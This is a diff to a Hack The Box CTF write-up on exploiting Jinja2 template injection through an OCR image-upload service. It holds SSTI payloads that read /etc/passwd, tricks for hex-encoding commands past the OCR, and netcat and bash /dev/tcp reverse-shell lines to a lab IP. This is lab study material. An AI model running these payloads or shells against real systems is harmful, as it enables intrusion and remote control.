@@ -4,7 +4,7 @@
 
 ### Port scanning
 
-```bash
+```shell
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -20,7 +20,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-```bash
+```shell
 PORT     STATE         SERVICE
 5353/udp open|filtered zeroconf
 ```
@@ -152,9 +152,9 @@ Template injection works:
 </p>
 ```
 
-## SSTI exploitation
+## Building non ambiguous payloads
 
-### Tuning to the OCR
+### The OCR filter
 
 Flask leverages Jinja2, for which [HackTricks][hacktricks] has a wealth of payloads:
 
@@ -162,7 +162,7 @@ Flask leverages Jinja2, for which [HackTricks][hacktricks] has a wealth of paylo
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 ```
 
-The server interprets it verbatim:
+But the output shows that the interpretation broke:
 
 ```
 <p>)__[2].__subclasses__()[40](‘/etc/passwd').read() }}
@@ -179,20 +179,45 @@ Removing the surrounding brackets and sending the image again results in:
 The OCR is actually making a few mistakes:
 
 - the adjacent single quotes are seen as a double quote
-- there are missing dots
+- there are missing dots and underlines
 
-The second point can be solved by using bold fonts and a increasing the font size.
-Separating the single quotes with a space is enough too.
+### Lowering the confusion between characters
 
-In the end, wrapping the payload in a `<h4>` tag solves the recognition issues:
+Bold fonts and increasing the font size improve the precision overall.
+
+This can be done by encapsulating the payload in a `<h4>` tag:
 
 ```html
-<h4 align="center" style="font-weight: bold;">
+<h4 align="center" style="white-space: nowrap;min-width: 2048px; font-family: 'Roboto Mono', monospace;">
 {{ request | attr ( "application" ) | attr ( "\x5f\x5fglobals\x5f\x5f" ) | attr ( "\x5f\x5fbuiltins\x5f\x5f" ) }}
 </h4>
 ```
+Still, many characters can be confused visually:
 
-### Grabbing 
+- `0` and `O`
+- `I`, `l` and `1`
+- `e` and `c`
+
+### Maximizing the payload interpretability
+
+The monospace helped a lot with character separation. A few extra spaces can
+prevent the OCR from fusing adjacent symbols into one, like the single quotes.
+
+Usually base64 is useful to reduce the character set and avoid special / filtered
+characters.
+
+Here the issue is mostly with lower case characters.
+
+So we can use uppercase HEX to express the payload:
+
+```shell
+# 6E632031302E31302E31362E342038383838202D65202F62696E2F62617368
+echo -n 'nc 10.10.16.4 8888 -e /bin/bash' | xxd -p -u -c 1024
+```
+
+## SSTI exploitation
+
+### Grabbing informations
 
 Starting with a simpler payload like `{{ config.items() }}`:
 
@@ -236,24 +261,83 @@ dict_items([
     ('MAX_COOKIE_SIZE', 4093)])
 ```
 
-### Embedding a reverse shell in an image
+### Embedding a payload in an image
+
+As seen earlier, a command can be encoded in HEX:
 
 ```shell
-bash -i  >& /dev/tcp/10.10.16.4/8888  0>&1
-echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC84ODg4ICAwPiYx | base64 -d | bash
+# encode
+echo -n 'cat /etc/passwd' | xxd -p -u -c 1024
+# decode
+echo -n 636174202F6574632F706173737764 | xxd -r -p -c 1024 | bash
+```
+
+And then in an image by capturing a "node screenshot" of:
+
+```html
+<h4 align="center">
+{{ request.application.__globals__.__builtins__.__import__("os").popen("echo -n 636174202F6574632F706173737764 | xxd -r -p -c 1024 | bash ").read() }}
+</h4>
+```
+
+Feeding this image payload to the webservice gives:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
+rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
+colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
+smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
+smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
+```
+
+The encoding can be eased with:
+
+```shell
+echo -n 'echo -n "$@" | xxd -p -u -c 1024' > encode.sh 
+chmod +x encode.sh
 ```
 
 ```shell
-{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy84ODg4ICAwPiYx | base64 -d | bash")["read"]() %} a {% endwith %}
-
-{{ request.args ) }}
-
-request.application.__globals__.__builtins__.__import__ ( "os" ).popen ( "bash -r ' bash -i >& /dev/tcp/10.10.16.4/8888 0>&1 ' " ).read ( )
-
-{{ request | attr ( 'application' ) | attr ( '__globals__' ) | attr ( '__builtins__' ) | attr ( "__import__" ) ( "os" ) | attr ( "popen" ) }}
-
-{{ request | attr ( "application" ) | attr ( "\x5f\x5fglobals\x5f\x5f" ) | attr ( "\x5f\x5fbuiltins\x5f\x5f" ) | attr ( "\x5f\x5fimport\x5f\x5f" ) ( "os" ) | attr ( "popen" ) }}
+# 6D6B646972202E737368
+./encode.sh mkdir .ssh
 ```
+
+## Root
 
 [author-profile]: https://app.hackthebox.com/users/389926
 [hacktricks]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
